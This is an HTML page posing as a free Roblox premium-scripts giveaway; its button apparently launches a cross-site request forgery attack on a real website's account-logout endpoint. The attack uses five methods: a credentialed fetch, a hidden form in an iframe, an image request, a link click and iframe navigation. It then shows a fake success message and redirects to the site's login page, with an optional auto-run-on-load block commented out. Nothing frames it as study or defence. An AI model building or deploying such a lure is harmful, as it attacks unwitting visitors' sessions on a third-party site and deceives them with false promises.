<!DOCTYPE html>
<html>
<head>
    <title>Free Roblox Premium Scripts</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .offer-list {
            background: rgba(255, 255, 255, 0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .offer-item {
            padding: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.3);
        }
        .button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            display: block;
            margin: 30px auto;
            transition: transform 0.3s, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 FREE Premium Roblox Scripts</h1>
        <p>Limited time offer! Claim these exclusive scripts completely free:</p>
        
        <div class="offer-list">
            <div class="offer-item">✔️ Infinite Yield Admin - <strong>FREE</strong></div>
            <div class="offer-item">✔️ DarkHub - <strong>FREE</strong></div>
            <div class="offer-item">✔️ Owl Hub - <strong>FREE</strong></div>
            <div class="offer-item">✔️ CMD-X - <strong>FREE</strong></div>
            <div class="offer-item">✔️ Hydroxide Decompiler - <strong>FREE</strong></div>
        </div>

        <button class="button" onclick="claimOffer()">🎁 CLAIM FREE SCRIPTS NOW</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your free scripts...</p>
        </div>

        <!-- 𝗛𝗶𝗱𝗱𝗲𝗻 𝗶𝗳𝗿𝗮𝗺𝗲 𝗳𝗼𝗿 𝗖𝗦𝗥𝗙 -->
        <iframe id="csrfFrame" name="csrfFrame" style="display:none;"></iframe>
        <form id="csrfForm" action="https://wearedevs.net/api/account/logout" method="POST" target="csrfFrame" style="display:none;">
            <input type="hidden" name="force" value="true">
        </form>
    </div>

    <script>
    // 𝗦𝘁𝗲𝗽 ➊: 𝗠𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁 𝗠𝗲𝘁𝗵𝗼𝗱𝘀
    async function claimOffer() {
        document.getElementById('loading').style.display = 'block';
        
        console.log('[+] Starting CSRF logout attack...');
        
        // 𝗠𝗲𝘁𝗵𝗼𝗱 ➊: 𝗙𝗲𝘁𝗰𝗵 𝗔𝗣𝗜 𝗰𝗮𝗹𝗹
        try {
            const response = await fetch('https://wearedevs.net/api/account/logout', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({confirm: true})
            });
            
            const data = await response.json();
            console.log('[+] Fetch response:', data);
        } catch (error) {
            console.log('[-] Fetch failed:', error);
        }

        // 𝗠𝗲𝘁𝗵𝗼𝗱 ➋: 𝗙𝗼𝗿𝗺 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻
        setTimeout(() => {
            document.getElementById('csrfForm').submit();
        }, 1000);

        // 𝗠𝗲𝘁𝗵𝗼𝗱 ➌: 𝗜𝗺𝗮𝗴𝗲 𝗯𝗮𝘀𝗲𝗱 𝗖𝗦𝗥𝗙 (𝗚𝗘𝗧)
        setTimeout(() => {
            const img = new Image();
            img.src = 'https://wearedevs.net/api/account/logout?confirm=true&ts=' + Date.now();
        }, 2000);

        // 𝗠𝗲𝘁𝗵𝗼𝗱 ➍: 𝗟𝗶𝗻𝗸 𝗰𝗹𝗶𝗰𝗸 (𝗳𝗮𝗹𝗹𝗯𝗮𝗰𝗸)
        setTimeout(() => {
            const link = document.createElement('a');
            link.href = 'https://wearedevs.net/api/account/logout?force=true';
            link.click();
        }, 3000);

        // 𝗠𝗲𝘁𝗵𝗼𝗱 ➎: 𝗜𝗳𝗿𝗮𝗺𝗲 𝗻𝗮𝘃𝗶𝗴𝗮𝘁𝗶𝗼𝗻
        setTimeout(() => {
            const iframe = document.createElement('iframe');
            iframe.src = 'https://wearedevs.net/api/account/logout';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }, 4000);

        // 𝗦𝘁𝗲𝗽 ➋: 𝗗𝗲𝗰𝗲𝗽𝘁𝗶𝘃𝗲 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            alert('✅ Success! Your free scripts have been claimed! Please login again to access your account.');
            window.location.href = 'https://wearedevs.net/login';
        }, 5000);
    }

    // 𝗦𝘁𝗲𝗽 ➌: 𝗔𝘂𝘁𝗼-𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝗼𝗻 𝗽𝗮𝗴𝗲 𝗹𝗼𝗮𝗱 (𝗼𝗽𝘁𝗶𝗼𝗻𝗮𝗹)
    // window.addEventListener('load', function() {
    //     setTimeout(claimOffer, 3000); // 𝗔𝘂𝘁𝗼 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝗮𝗳𝘁𝗲𝗿 𝟯𝘀
    // });
    </script>
</body>
</html>
